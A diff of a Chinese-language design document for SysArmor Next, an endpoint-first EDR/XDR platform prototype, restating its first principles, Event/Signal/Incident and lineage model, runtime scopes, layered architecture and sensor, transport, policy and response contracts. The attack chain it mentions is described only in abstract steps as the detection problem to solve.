@@ -1,41 +1,83 @@
-# SysArmor Next 设计精要
+# SysArmor Next 设计纲领
 
-> 一句话：**SysArmor Next 是面向 EDR/XDR 的安全平台原型：端侧在源头给每条内核事实盖上因果上下文、拦住最危险的瞬间、并产出带标签的种子；云端把端点、云、身份、网络等事实流连成溯源图，用罕见度加权 + 结构收敛裁决告警。**
+> 一句话：**SysArmor Next 是面向 EDR/XDR 的安全平台原型：端侧在源头给每条内核事实盖上因果上下文、拦住最危险的瞬间、并产出带标签的种子；云端把端点、云、身份、网络、工作负载等事实流连成溯源图，用罕见度加权 + 结构收敛裁决告警。**
 
-本文从零讲清楚 SysArmor Next 的定位、抽象和分层。它不记录历史决策，只讲"为什么是这样"。完整工程细节与 schema 见 design-mvp.md / design.md。
+本文只讲稳定设计：我们要解决什么问题、基于哪些第一性原理、系统应具备哪些能力、分层抽象是什么、组件之间通过什么契约交互、哪些边界不能被实现细节污染。具体实现进展、测试结果和版本历史放在 changelog / plan 文档中。
 
 ---
 
-## 零、项目定位：从 EDR 走向 XDR
+## 一、要解决的问题
 
-SysArmor Next 的长期目标不是做一个 Tetragon 日志转发器,也不是只做某个单点检测引擎,而是构建一个可演进的 **EDR/XDR 平台原型**。
-
-它的路线可以分成四层:
+现代攻击很少表现为一个孤立的“坏动作”。攻击者更常用一串看起来都合理的操作完成目标：
 
 ```text
-v1: EDR detection path MVP
-  endpoint event -> agent -> manager -> signal -> incident
-  验证"事实纵轴 + 基本收敛"这条检测链路成立
-
-v2: EDR endpoint runtime MVP
-  agent daemon + sensor runtime + health + spool + policy apply
-  把 v1 检测链路放进可长期运行、可恢复、可观测的端点 runtime
-
-中期: EDR platform
-  长期驻留 agent、策略控制、端侧检测/响应、取证回拉、incident lifecycle
-
-长期: XDR platform
-  endpoint + workload + cloud audit + identity + network + CI/CD 等多源遥测
-  跨域实体图、攻击链收敛、风险裁决、响应编排
+web runtime spawn shell
+  -> curl 下载脚本
+  -> chmod / exec
+  -> 读 token / key
+  -> 外联或横向移动
+  -> 云资源 / 身份 / 网络侧继续扩散
 ```
 
-因此 SysArmor Next 的核心边界不是某个 sensor、某个规则包或某个测试场景,而是三件长期能力:
+单看每一步,它们都可能像正常运维。把每个动作都报警会制造误报风暴；把它们都沉默又会漏掉攻击。
 
-1. **端点运行时**: endpoint agent 必须能长期运行、可观测、可恢复、可控、可响应。
-2. **事实与图模型**: 所有数据源最终都要落到统一的 Event / Signal / Incident 事实纵轴和 entity graph 上。
-3. **跨域收敛**: EDR 先从 endpoint 图开始,XDR 再把 cloud、identity、network、workload 等事实并入同一张攻击叙事图。
+SysArmor Next 的核心问题是：
 
-这里还有一个很重要的边界判断: **endpoint 不等于“永远是一台 VM 或物理主机”**。在 SysArmor Next 里,被保护对象更准确地说是一个 **runtime scope**。中期 EDR 要把这个模型显式沉淀为 Sensor Runtime 的稳定契约:
+> 如何在海量看似正常的事实里,把少数真正相关的事实连成一条可解释的攻击链,并在攻击造成损害前做出授权范围内的响应？
+
+因此,系统不能只做日志转发,也不能只做单点规则匹配。它必须同时具备：
+
+- 端侧可信观测和快速响应。
+- 统一事实模型。
+- 云端跨实体、跨工作负载、跨时间、跨安全域的图收敛。
+- 可运营的策略、规则、响应和调查闭环。
+
+---
+
+## 二、第一性原理
+
+| | 事实 | 设计推论 |
+|---|---|---|
+| P1 | 内核是行为的唯一可信来源,用户态可被绕过或伪造 | 关键采集和阻断必须尽量靠近内核,通过 eBPF/LSM/sensor backend 获取事实 |
+| P2 | 攻击是因果链,不是孤立事件 | 告警必须来自图上的结构裁决,不是单事件判断 |
+| P3 | 上下文在源头打很便宜,事后重建很贵 | 端侧给事实打 lineage、scope、entity 标签,云端再建图 |
+| P4 | 端侧资源与业务争抢,云端资源弹性更好 | 端侧只维护 O(活跃实体) 的轻量状态,复杂图计算上移云端 |
+| P5 | 检测内容天天变,执行核心变化很少 | 检测靠可版本化、可热更新的规则内容和策略,不靠频繁改代码 |
+| P6 | 响应动作有破坏性 | 响应必须由策略授权、可审计、默认 observe-only,不能绕过控制面 |
+| P7 | 部署形态会变化 | host、container、cgroup、namespace、pod 都要落到统一 runtime scope,不能让拓扑特判渗透到上层 |
+
+---
+
+## 三、系统应具备的能力
+
+### 3.1 Endpoint Runtime
+
+端侧 agent 应长期运行,并具备：
+
+- 加载配置和身份。
+- 管理 sensor runtime。
+- 探测能力和健康状态。
+- 应用采集策略。
+- 订阅内核/工作负载事件。
+- 归一化事件并打 lineage / scope / entity 标签。
+- 执行端侧快路径规则。
+- 生成 Event / Signal / evidence seed。
+- 本地 durable spool。
+- 断网/重启后续传。
+- 上报 health / heartbeat / tamper signal。
+- 接收策略、回拉、响应等下行指令。
+
+端侧不是一个“脚本采集器”,而是 EDR/XDR 数据面和响应面的第一跳。
+
+### 3.2 Sensor Runtime
+
+Sensor Runtime 是端点可见性和可选阻断能力的封装层。它屏蔽具体 backend：
+
+- 当前可以由 Tetragon 实现。
+- 未来可以替换或并行接入 native sensor。
+- 上层只依赖 Sensor Contract,不直接消费 backend raw JSON。
+
+Sensor Runtime 必须支持 scope：
 
 ```text
 Sensor Runtime
@@ -44,402 +86,623 @@ Sensor Runtime
     selector: ...
 ```
 
-其中:
+含义：
 
-- VM / 裸机是 `host scope`
-- 单个容器或 cgroup workload 是 `container/cgroup scope`
-- K8s workload 是 `pod/namespace scope`
+- VM / 裸机是 `host` scope。
+- 单容器或 cgroup workload 是 `container` / `cgroup` scope。
+- K8s workload 是 `pod` / `namespace` scope。
 
-也就是说,我们并不要求所有部署形态都长得像“在一台独立内核机器里装 agent”。我们要求的是:无论被保护对象是 host 还是 workload,都能落到同一套 Sensor Runtime / Endpoint Core / Event-Signal-Incident 抽象里。VM 只是 `scope.type=host` 的一个部署形态;容器、cgroup、pod、namespace 则是同一 runtime contract 下的不同采集边界。这个 contract 也是后续代码、配置和测试的共同语言:配置表达 scope,policy 编译使用 scope,health 归属到某个 runtime scope,manager 侧则按同一 identity 观察 agent 状态。对容器来说,默认形态应是独立 privileged `sysarmor-agent + tetragon` sensor container 观测目标 workload,而不是把业务容器本体当成“迷你 VM”来塞入 agent。
+容器不是迷你 VM。默认容器架构是运行独立 privileged `sysarmor-agent + sensor` container,由它观测目标 workload scope。业务容器内安装 agent 可以作为调试、受限环境或兼容模式,但不是默认产品架构。
 
-Tetragon 是当前最现实的 Linux sensor backend,不是产品定位本身。v1/v2 的工程重点看起来集中在 Tetragon、agent、Link1 和 manager,但它们服务的是更长线的 EDR/XDR 架构:先把端点事实采集、检测、缓存、恢复和健康闭环跑稳,再把更多安全域接进同一套事实、图和控制平面。
+### 3.3 Policy And Rule Content
 
-更具体地说,SysArmor Next 当前选择的是一条 **endpoint-first 的 EDR/XDR 演进路线**:
+检测内容必须可运营：
 
-- 先把 endpoint agent、sensor runtime、事实模型和最小控制链路做成真的。
-- 再把 investigation、response、incident lifecycle 做成更完整的 EDR 平台。
-- 最后再把 cloud audit、identity、network、K8s、CI/CD 等遥测并到同一套事实轴和实体图,扩成 XDR。
+- 规则有 id、version、where、severity、tags、MITRE、response intent。
+- 策略能引用规则、启停规则、指定 scope、指定 observe/enforce mode。
+- manager 能发布策略版本、灰度、回滚、分配给 agent/scope。
+- agent 能获取 effective policy 并应用。
+- cloud analytics 能按同一 policy 控制云端规则。
 
-这条路线的含义是:短期文档和实现里即便会频繁出现 Tetragon、agent daemon、spool、health、policy apply,它们也不只是"为了把 Linux 采集跑起来",而是在给后续 EDR/XDR 共用的数据面、控制面和运行时地基打桩。
+规则内容是产品能力,不应长期硬编码在执行引擎里。
 
-对容器场景,这条路线还有一个直接推论:
+### 3.4 Response / Enforce
 
-- **不建议把业务容器本体直接等价成一台 VM 来处理。**
-- 默认架构应是:运行一个独立的 privileged `sysarmor-agent + tetragon` sensor container,去观测某个目标容器、某个 cgroup 或某组 workload。
-- 这样做时,agent 拥有 sensor process / policy / health / spool / upload 生命周期;被保护对象则通过 scope selector 来限定,比如 container id、cgroup path、namespace inode、pod identity 或 label selector。
-- `container_id_prefix` 这类字段只能作为兼容旧配置的 alias,长期 contract 应收敛为 `scope.type + scope.selector`。
-- 把 agent 安装进业务容器内部可以保留为调试、受限环境或兼容模式,但不能作为默认产品架构。
+响应能力分两层：
 
-这让“容器安全”在产品语义上更接近 **workload-scoped EDR runtime**,而不是“把 agent 塞进业务镜像里”。
+- **Response intent**：Signal 表达建议动作,例如 kill、block、quarantine、collect。
+- **Response decision**：Control Plane 根据 policy、scope、权限和审批状态决定是否执行。
 
-换句话说,对 SysArmor Next 的定位可以用一句更工程化的话概括:
-
-> **v1 证明我们能检测,v2 证明我们能常驻运行,后续 EDR/XDR 才是在这块 runtime 地基上扩图、扩域、扩控制面。**
-
----
-
-## 一、从一个问题开始
-
-现代 EDR/XDR 真正难的不是"看见一个坏动作"，而是**看见一条横跨进程、文件、网络、主机、云资源、身份、时间的攻击链**。
-
-攻击者很少用一个明显的恶意操作暴露自己。他们用的每一步单独看都像正常运维：`curl` 下载文件、`chmod +x`、读一个配置文件、发起一个 SSH 连接。把这些孤立动作各自报警，得到的是误报风暴；把它们沉默处理，得到的是漏报。
-
-所以核心问题是：
-
-> 如何在海量看起来正常的事件里，把少数真正相关的事件**连成一条可解释的因果链**，并在攻击造成损害前做出反应？
-
-SysArmor 的全部设计都是这个问题的答案。
-
----
-
-## 二、五条第一性原理
-
-一切从五条不证自明的事实推导：
-
-| | 事实 | 推论 |
-|---|---|---|
-| P1 | 内核是行为的唯一可信来源，用户态可被绕过和伪造 | 采集和阻断必须在内核（eBPF/LSM） |
-| P2 | 攻击是因果链，不是孤立事件 | 必须有一张连接实体的**溯源图**；告警是图上的裁决，不是单事件的判断 |
-| P3 | 上下文在源头打很便宜，事后重建很贵；图在源头建很贵，集中建很便宜 | **端侧打标，云端建图** |
-| P4 | 端侧资源与业务争抢，云端资源弹性 | 端侧状态必须 O(活跃实体)，重计算上移云端 |
-| P5 | 检测内容天天变，执行核心很少变 | 检测靠**可热更新的签名内容**，不靠改代码 |
-
-P3 是最关键、也最反直觉的一条。它直接决定了 SysArmor 不像学术系统那样在端侧维护大图，也不像传统 HIDS 那样把裸事件丢给 SIEM 事后查询，而是走一条中间路线：**端侧只做"贴标签"，云端做"拼图"**。
-
----
-
-## 三、核心抽象：一根纵轴（三层事实）+ 一根横轴（lineage）
-
-SysArmor 的世界里只有一种东西在流动：**事实（fact）**。理解整个系统只需要两根正交的轴。
-
-### 纵轴：事实被提炼的高度（三层）
+默认路径应是 observe-only：
 
 ```text
-Incident   攻击故事。 "Log4Shell 入侵 → C2 → 窃取凭据 → 横向移动"
-   ▲       图上风险收敛后的裁决，面向人的唯一告警单元。
-   │
-Signal     规则从事实派生出的新事实。 "一个 web 运行时进程 spawn 了 shell"
-   ▲       带一组属性（见下），低风险的是中性积木，高风险的是检测发现。
-   │
-Event      一次内核行为。 "pid 4231 exec 了 /bin/bash"
-           sensor 采集 + normalize 后的客观事实，不含任何检测逻辑。
+Signal.response_intent
+  -> policy authorization
+  -> response command
+  -> agent validate scope/policy
+  -> sensor Enforce
+  -> response ack/audit
 ```
 
-只有三层，是因为这三者各自做的是**本质不同的操作**：
+任何真实阻断都必须有：
 
-- **Event** 是观测到的，不含检测逻辑。
-- **Signal** 是规则在事实上匹配算出来的。Signal 可以引用 Event，也可以引用别的 Signal——规则的产物回灌成更上层规则的输入，检测能力靠这种组合无限叠加。
-- **Incident** 是风险在图上**收敛**裁决出来的，这是图算法/聚合，不是规则匹配，而且是给人看的那个东西。
+- 策略授权。
+- 租户/agent/scope 约束。
+- 审计记录。
+- 结果回传。
+- 回滚或降级策略。
 
-过去容易把"中性行为信号"和"检测发现"分成两层，其实它们做的是同一件事（规则派生事实），区别只是带不带风险分。所以它们是同一层 **Signal** 的不同取值，风险分只是 Signal 的一个属性。Signal 的关键属性：
+### 3.5 Cloud Analytics
 
-| 属性 | 取值 | 作用 |
-|---|---|---|
-| `risk` | 0 ~ 高 | 0~低是中性积木（不单独告警，只往图上贡献风险）；高是检测发现 |
-| `where` | 端侧快路径 / 云端图 | 决定规则下发到哪、能看到什么 |
-| `entities` | 进程/文件/IP/token… | **云端缝合用的 join key**，规则必须吐出涉及的实体 |
-| `terminal` | 可选 | 端侧高置信时直接标记为攻击锚点 + 附证据包 |
-| `response` | 可选 | 高风险且在端侧产出的 Signal 可带响应意图，触发快路径动作 |
+云端负责把端侧和外部数据源产出的事实连接成图,再裁决告警。它应具备：
 
-三层之间有三条铁律：
+- entity normalization。
+- provenance graph。
+- lineage/entity index。
+- cloud signal rules。
+- rarity baseline。
+- correlation / dedup / suppression。
+- converge / incident decision。
+- evidence subgraph extraction。
+- incident lifecycle。
 
-1. **逐层提炼**：高层事实由规则/收敛从低层事实派生。
-2. **越往上越稀疏**：百万 Event → 几十 Signal → 一个 Incident。误报在逐层收敛中被抑制。
-3. **告警只在顶层**：单个 Signal 默认不告警，它只是图上的一份（经罕见度加权的）风险；只有当若干**各自独立罕见**的高风险点在因果上被**结构收敛**（扩散/STP）连成紧凑子图，才裁决出 Incident——**不是"风险分累加超阈值"，纯加法是反模式**（见第四节）。例外是端侧高风险 Signal——为抢响应窗口可在授权范围内立即动作，但它仍上云参与裁决。
+云端图不是为了“好看”,而是为了把单点无法判断的弱信号连成攻击故事。
 
-这一根纵轴同时覆盖了成熟 EDR 里被拆成两类产品的能力：**行为检测**（Falcon 的 IOA、青藤的行为引擎）就是写 Signal 规则，**深度溯源**（SentinelOne 的 Storyline）落在 Incident 的图收敛。进一步扩到 XDR 时,云审计、身份、网络、K8s、CI/CD 等数据也不需要另起一套告警模型,只要归一成 Event、派生 Signal、参与 Incident 收敛。它们不再是多套系统，而是同一根轴的不同高度和不同数据域。
+### 3.6 Incident And Evidence
 
-### 横轴：lineage（贯穿三层的索引）
+Incident 是唯一面向人的告警单元。它不是一堆 signal 的列表,而是一条攻击故事：
 
-lineage 不是纵轴上的一层，而是贯穿三层的**身份/索引坐标**，回答"这条事实属于谁"。
+- terminals：攻击锚点。
+- contributing signals：贡献事实。
+- evidence graph：实体和关系。
+- timeline：关键时间线。
+- converge trace：为何裁决为 incident。
+- response history：响应意图、授权、执行结果。
+- lifecycle：create / update / merge / suppress / close。
 
-每个进程在 `exec` 时获得一个 `lineage_id`，继承自它所属执行谱系的根，被盖在这个谱系产生的**每一条** Event 上：
+调查入口应该能回答：
+
+- 攻击从哪里开始？
+- 经过了哪些进程、文件、socket、账号、容器、pod、主机或云资源？
+- 哪些点是罕见的？
+- 哪些点是结构上必要的？
+- 哪些动作已经被端侧响应？
+
+### 3.7 Durable Store
+
+平台状态必须可恢复、可查询、可审计：
+
+- agents
+- agent health
+- policies / policy versions / assignments
+- rules / rule versions
+- events
+- signals
+- incidents
+- evidence
+- response audit
+- metrics
+
+文件存储适合原型和轻量测试；平台化需要数据库、迁移、索引、分页、TTL、幂等写入和审计。
+
+### 3.8 Link1 Transport
+
+Agent 与云端之间需要一条可靠的安全控制/数据通道：
+
+- 上行 Event / Signal / health / evidence seed。
+- 下行 policy / response command / evidence pullback request。
+- batch id / ack cursor / resume。
+- agent session。
+- backpressure。
+- authn/authz。
+- schema version negotiation。
+
+HTTP/gRPC unary 可以作为简单上传路径；长期应演进为双向 stream。OTel 适合作为云端向 SIEM/SOAR/数据湖的出口,不应替代 Agent ↔ Gateway 的原生安全通道。
+
+### 3.9 XDR Ingestion
+
+XDR 的关键不是多接几个日志源,而是把更多安全域归一成同一套事实模型：
+
+- cloud audit
+- identity
+- network flow
+- K8s audit
+- CI/CD
+- registry
+- SaaS audit
+
+原生 agent 是一等公民,因为它能在源头打 lineage。agentless adapter 是二等公民,因为它只能在云端尽力补齐上下文。两者都必须输出 CanonicalEvent / Signal / Entity,进入同一张图。
+
+---
+
+## 四、核心抽象
+
+### 4.1 Event / Signal / Incident
+
+SysArmor 的事实流只有三层。
 
 ```text
-              纵轴：提炼高度
-   Incident ┐        ← 按 lineage + 共享实体在图上收敛
-            │
-   Signal   │        ← 继承所属 Event 的 lineage，端侧规则状态按它分区
-            │
-   Event    ┘        ← exec 时盖上 lineage_id（产生处）
-   ─────────────────────────────►  横轴：lineage
-   tl-A   tl-B   tl-C ...
+Incident   攻击故事。图上风险收敛后的裁决,面向人的告警单元。
+   ▲
+Signal     规则从事实派生出的新事实。可以是低风险积木,也可以是高风险检测发现。
+   ▲
+Event      sensor 采集并归一后的客观内核/工作负载行为,不含检测逻辑。
 ```
 
-它是 P3 的直接体现：在源头，进程父子关系唾手可得（一次指针查找）；事后从乱序事件重建谱系则很贵。所以在最便宜的地方把这个键打好，让纵轴每一层免费受益：
+三层的职责边界：
 
-- 端侧：快路径规则用它做状态分区（"这条谱系 30 秒内发生了什么"）。
-- 云端：建图时事件已天然按谱系分簇，无需重建执行谱系。
-- 调查：一键拉出一整条行为线。
+- Event 是观测事实。
+- Signal 是规则派生事实。
+- Incident 是图上裁决结果。
 
-类比数据库：Event/Signal/Incident 是"表"，`lineage_id` 是 partition/索引键。它缝的是**同一谱系内**的事实；跨谱系的事实由另一个维度缝——**共享实体**（同一个文件、IP、token），两者在 Incident 收敛时共同把散落的事实连成案。
+Signal 的关键字段：
+
+| 字段 | 作用 |
+|---|---|
+| `risk` | 表示该事实对攻击判断的贡献,不是简单累加分 |
+| `where` | endpoint 或 cloud,决定规则运行位置 |
+| `entities` | 进程、文件、socket、IP、token、user、container、pod 等 join key |
+| `terminal` | 是否是高置信攻击锚点 |
+| `response` | 是否带响应意图 |
+| `event_refs` | 指向原始事件或证据 |
+
+告警只应该在 Incident 层对外呈现。单个 Signal 默认不直接告警,除非它是端侧高置信 terminal 并触发授权范围内的快路径响应。
+
+### 4.2 Lineage
+
+lineage 是贯穿 Event / Signal / Incident 的索引坐标,回答“这条事实属于哪条执行谱系”。
+
+每个进程在 exec 时获得 lineage id。它继承父进程谱系,并被盖到该谱系产生的每条事实上：
+
+```text
+Incident ┐        ← 按 lineage + entity graph 收敛
+Signal   │        ← 继承所属 Event 的 lineage
+Event    ┘        ← exec 时盖 lineage_id
+──────────────────► lineage
+```
+
+lineage 的作用：
+
+- 端侧规则按谱系做轻量状态。
+- 云端图按谱系聚簇。
+- 调查时能拉出行为线。
+
+端侧持有的是 lineage 标签和短期状态,不是长期记忆。跨天、跨主机、跨 workload 的记忆在云端图里。
+
+### 4.3 Entity Graph
+
+云端图由实体和关系组成：
+
+```text
+nodes:
+  process, file, socket, ip, host, container, pod, namespace,
+  user, token, cloud principal, IAM role, CI job, registry artifact
+
+edges:
+  fork, exec, read, write, connect, load, mount,
+  owns, belongs_to, authenticates_as, assumes_role, deploys
+```
+
+lineage 负责同一执行谱系内的事实索引；entity graph 负责跨谱系、跨主机、跨工作负载、跨云资源的连接。
+
+### 4.4 Runtime Scope
+
+runtime scope 是被保护对象的边界：
+
+```text
+type RuntimeScope struct {
+    Type     string // host | container | cgroup | namespace | pod
+    Selector string
+}
+```
+
+所有能力都应能归属到 scope：
+
+- policy assignment
+- sensor health
+- event collection
+- response authorization
+- evidence query
+- incident scope
+- agent status
+
+这样 manager 看到的不是“某个容器里装了 agent”,而是“某个 agent runtime 正在保护某个 scope”。
 
 ---
 
-## 四、把事实拼成图，并正确地收敛
-
-云端把端侧上来的 Signal 流，按实体连成一张 **Provenance Graph**：
-
-- **节点**：进程、文件、Socket/IP、容器、Pod、User、Host……
-- **边**：fork、exec、read、write、connect、load、mount……
-- **标注**：每个节点/边上挂着它携带的 Signal 和风险分。
-
-为什么这张图在云端而不在端侧？因为图的价值恰恰来自**跨边界**——跨进程、跨容器、跨主机、跨小时。这些信息端侧单机看不全（host-A 永远不知道它外联的 IP 就是攻击 host-B 的跳板），而云端天然汇聚。同时图的规模随活跃实体增长，正是 P4 要从端侧搬走的负担。
-
-### 收敛为什么不能用加法
-
-最直觉的做法是"子图内 Signal 风险分累加超阈值就告警"。**这是反模式**：忙碌或长寿的良性实体（CI runner、特权 agent）做的每件事都有正分，攒够数必然把任何阈值撑爆——调阈值只会两头不讨好（误报 + 漏报）。同样的 `落盘→执行→外联`，在 CI 节点上是日常、在 nginx worker 上是攻击，但加法看不到"对谁而言"，给一样的分。
-
-正确收敛靠两个正交机制：
-
-1. **罕见度加权**：一个行为对它所属实体/workload 越罕见，权重越高；惯常行为权重趋零。`同一个动作在 CI 上 rarity≈0、在 nginx 上 rarity≈1`。这样良性忙碌从构造上就"没有可累加的料"。
-2. **结构收敛**：判定从"分数和超没超"换成"几个**各自独立罕见**的点是否在因果上**紧凑相连**"。忙碌能产生"量"，但产生不了"多个独立罕见点构成的紧凑因果结构"。
-
-这正是 NODLINK 的思想：**节点异常分（罕见度/行为嵌入）+ 在线 Steiner Tree**，把散落的高异常节点连成最小攻击子图，裁决成唯一对外的 Incident。工程上还配合"相关族去重"（同一动作派生的多个 Signal 只算一次）。这些都是标准件——罕见度可用 IDF + Count-Min Sketch，扩散可用 Personalized PageRank 的局部 push，Steiner 可用 KMB 近似，复杂度与全图无关、惰性触发，不比加法更贵。
-
----
-
-## 五、架构分层
-
-抽象落到系统上，是清晰的五层。每层只依赖上下相邻层的**稳定契约**，不依赖其实现。EDR 是这套架构的第一落点:XDR 是同一套架构向更多遥测域的自然外延。
+## 五、系统分层
 
 ```text
 ┌─────────────────────────────────────────────────────────┐
-│  Control Plane     策略下发、灰度、回滚、响应授权、调查 UI    │  ← EDR/XDR 控制面
+│ Control Plane                                           │
+│ 策略、规则、灰度、回滚、响应授权、调查入口、租户权限      │
 ├─────────────────────────────────────────────────────────┤
-│  Cloud Analytics   建图 · 云端 Signal 规则 · 罕见度+结构收敛 │  ← 跨端点/跨域拼图、裁决
-│                    (NODLINK/STP) · Incident · 证据         │
+│ Cloud Analytics                                         │
+│ 建图、云端规则、罕见度、结构收敛、Incident、Evidence     │
 ├─────────────────────────────────────────────────────────┤
-│  Endpoint Core     打标(lineage) · 端侧 Signal 规则 · 上传 │  ← EDR agent 核心
+│ Gateway / Link1                                         │
+│ Agent 连接终结、上行摄入、ack/resume、下行策略/响应      │
 ├─────────────────────────────────────────────────────────┤
-│  Sensor Runtime    Tetragon today / Native Sensor later    │  ← 端点可见性/阻断
+│ Endpoint Core                                           │
+│ lineage、normalize、端侧规则、证据种子、spool、upload    │
 ├─────────────────────────────────────────────────────────┤
-│  Kernel / Workload Linux kernel · container · K8s          │
+│ Sensor Runtime                                          │
+│ Tetragon / Native Sensor, capability, health, enforce    │
+├─────────────────────────────────────────────────────────┤
+│ Kernel / Workload                                       │
+│ Linux kernel, process, file, network, container, K8s     │
 └─────────────────────────────────────────────────────────┘
 ```
 
-三个边界值得单独点名，它们是系统能长期演进的原因：
+分层原则：
 
-- **Sensor Contract**（Sensor Runtime ↔ Endpoint Core）：定义"一条事件长什么样、采集意图怎么表达、能力如何探测、如何阻断"。今天它由 Tetragon 实现，明天可以换成自研 Native Sensor，上层不动。所以 Tetragon 的 `GetEvents` 是实现细节，不是我们的边界。
-- **Edge-Cloud Analytics Contract**（Endpoint Core ↔ Cloud Analytics）：定义上行流（Event 流、Signal 流、证据包、健康流）和下行回路（细节回拉、增强采集、响应指令）。它与具体图算法解耦——NODLINK 可以换成任何图分析，端侧无感。
-- **DetectionPolicy**（Control Plane → 两侧引擎）：签名的检测内容包。规则用统一 DSL 编写，靠 `where` 属性决定下发到端侧快路径还是云端分析层。这是 P5 的落地：加一条检测 = 下发一份签名内容，不发版、不改代码。
-
-其中 **Sensor Contract** 在中期 EDR 里应继续显式扩成带 scope 的模型:
-
-```text
-Sensor Runtime
-  scope:
-    type: host | container | cgroup | namespace | pod
-    selector: ...
-```
-
-这套抽象下:
-
-- VM / 裸机 = `host scope`
-- 容器 = `container` 或 `cgroup scope`
-- K8s workload = `pod` 或 `namespace scope`
-
-这样后续无论 agent 是部署在 VM 里、宿主机上,还是作为独立 sensor container 跑在 workload 旁边,上层都只看统一的 runtime contract,而不是感知具体拓扑细节。容器方案尤其要坚持这一点:agent+tetragon sensor container 是 runtime 的承载体,业务容器只是被观测的 scope;K8s 进一步扩展时也只是把 selector 从 container/cgroup 推进到 pod/namespace,而不是重新发明一套容器专用 agent 模型。
-
-**部署形态**：Cloud Analytics + Control Plane 在实现上拆成三个角色——**Gateway**（连接终结 + 数据摄入 + 策略下发，借鉴 Elkeid AgentCenter，无状态可水平扩展）、**Manager**（控制面：策略编写/签名/灰度、注册、调查）、**Analytics**（建图 + 收敛 + 裁决）。EDR 阶段,Gateway 的主输入是 SysArmor agent 上报的 endpoint 事实；XDR 阶段,异构数据源（auditd / Wazuh / k8s audit / cloud audit / identity / network / CI/CD）经 Gateway 的 **Ingestion Adapter** 归一成 CanonicalEvent 入图。但**原生 agent 是一等公民**（源头打标 lineage），**agentless 是二等公民**（云端尽力重建 lineage，上下文降级）。
-
-**传输分两段**：**Agent ↔ Gateway** 用原生 gRPC + 自有契约（双向：上行 Event/Signal/证据，下行策略/回拉/响应；保住强类型契约）；**Manager → 外部** 用 OTel Collector 扇出到 SIEM/SOAR/数据湖（OTel 的主场）。OTel 在云端出口，不在端到云的安全通道。
+- 上层依赖下层契约,不依赖下层实现。
+- manager/cloud 不直接消费 raw sensor JSON。
+- agent pipeline 不直接绑定某个 sensor backend。
+- control plane 不绕过 policy 直接发 response。
+- external export 不替代内部 Link1 协议。
 
 ---
 
-## 六、端侧为什么轻：三张表，不是一张图
+## 六、稳定契约与协议边界
 
-端侧（P4）不存图，只维护 O(活跃实体) 的状态：
+### 6.1 Sensor Contract
 
-```text
-进程上下文表    每个活跃进程的身份、父链、lineage_id     ∝ 活跃进程数
-谱系规则状态    每条 lineage 的计数器与序列机状态        ∝ 活跃 lineage 数
-实体接触缓存    "谁刚写了这个文件 / 连了这个 IP" 的 LRU     固定大小
-+ 原始事件环形缓冲（供云端回拉） + 上传队列（断网续传）
+Sensor Runtime ↔ Endpoint Core 的契约。
+
+```go
+type Sensor interface {
+    Capability(ctx context.Context) (Capability, error)
+    Apply(ctx context.Context, intent CollectionIntent) error
+    Subscribe(ctx context.Context, intent CollectionIntent) (<-chan EventEnvelope, error)
+    Enforce(ctx context.Context, cmd EnforcementCmd) (EnforcementAck, error)
+    Health(ctx context.Context) (Health, error)
+    Stop(ctx context.Context) error
+}
 ```
 
-第三张表是"图"在端侧的最小替身：它只支持快路径需要的**两跳关联**（写后执行、落盘后外联），绝不做任意跳数的图扩展——那是云端的事。这条界线让端侧成本可预测、可封顶。
+关键对象：
 
-注意：lineage_id 这个**标签**会随谱系根进程存活多久就持续多久（常驻进程可达数天），但端侧**不持有**对应这么久的事件和规则状态。跨天的记忆在云端图里——端侧持有的是"标签"，不是"记忆"。
+- `Capability`: backend、version、event support、enforce support、kernel/BTF/bpffs 等。
+- `CollectionIntent`: runtime scope、event kinds、file/socket filter、observe-only。
+- `EventEnvelope`: sensor-neutral event、raw ref、received_at。
+- `Health`: running、installed、policy_loaded、events_seen、events_dropped、parse_errors、restart_count。
+- `EnforcementCmd/Ack`: 阻断命令和结果,默认可以是 unsupported 或 observe-only。
+
+Tetragon 是实现,不是边界。
+
+### 6.2 Endpoint-Core Contract
+
+Endpoint Core 的输出必须是 sensor-neutral：
+
+- `CanonicalEvent`
+- `Signal`
+- `EvidenceSeed`
+- `AgentHealth`
+- `UploadBatch`
+
+它负责：
+
+- raw event -> canonical event。
+- process context -> lineage。
+- local rule state -> endpoint signal。
+- raw refs -> evidence seed。
+- durable queue -> upload batch。
+
+### 6.3 Link1 Agent-Gateway Protocol
+
+Link1 是 Agent ↔ Gateway 的原生安全通道。
+
+上行：
+
+- agent hello / session。
+- event batch。
+- signal batch。
+- evidence seed。
+- health heartbeat。
+- response result。
+
+下行：
+
+- policy update。
+- response command。
+- evidence pullback。
+- enhanced collection intent。
+
+可靠性语义：
+
+- batch id。
+- ack cursor。
+- resume。
+- idempotent ingest。
+- server-side backpressure。
+- schema/version negotiation。
+
+### 6.4 Policy / Rule Contract
+
+规则内容与策略控制面之间的契约。
+
+Rule:
+
+```text
+rule_id
+version
+where: endpoint | cloud
+enabled
+severity
+risk
+tags
+mitre
+response_intent
+inputs
+outputs
+```
+
+Policy:
+
+```text
+policy_id
+version
+tenant_id
+scope selector
+endpoint rule refs
+cloud rule refs
+response policy
+observe/enforce mode
+rollout state
+```
+
+Policy 的职责是回答：
+
+- 哪些规则对哪个 scope 生效？
+- 哪些规则在端侧跑,哪些在云端跑？
+- 哪些响应动作被允许？
+- 当前生效版本是什么？
+
+### 6.5 Response Contract
+
+响应链路必须显式可审计：
+
+```text
+Signal response_intent
+  -> ResponseDecision
+  -> ResponseCommand
+  -> EnforcementAck
+  -> ResponseAudit
+```
+
+任何执行结果都必须回写：
+
+- command accepted / denied。
+- would_enforce / executed / unsupported。
+- reason。
+- actor / policy / scope。
+- timestamp。
+
+### 6.6 Analytics Contract
+
+Cloud Analytics 的内部边界：
+
+```text
+ingest -> entity -> graph -> rules -> correlate -> converge -> incident -> evidence
+```
+
+每层职责：
+
+- `ingest`: 接收 CanonicalEvent / Signal。
+- `entity`: 归一化实体键。
+- `graph`: 保存节点和边。
+- `rules`: 生成 cloud signal。
+- `correlate`: 去重、折叠、抑制。
+- `converge`: 结构收敛和风险裁决。
+- `incident`: 生命周期。
+- `evidence`: 证据子图和路径。
+
+算法可以替换,但输出契约应稳定。
+
+### 6.7 Ingestion Adapter Contract
+
+外部数据源进入 XDR 图时必须归一：
+
+```text
+raw source event
+  -> CanonicalEvent
+  -> EntityRef
+  -> optional Signal
+  -> graph ingest
+```
+
+Adapter 必须声明：
+
+- source type。
+- tenant。
+- timestamp。
+- entity mapping。
+- confidence。
+- lineage quality：native / inferred / unavailable。
 
 ---
 
-## 七、端侧抢时间，云端讲故事
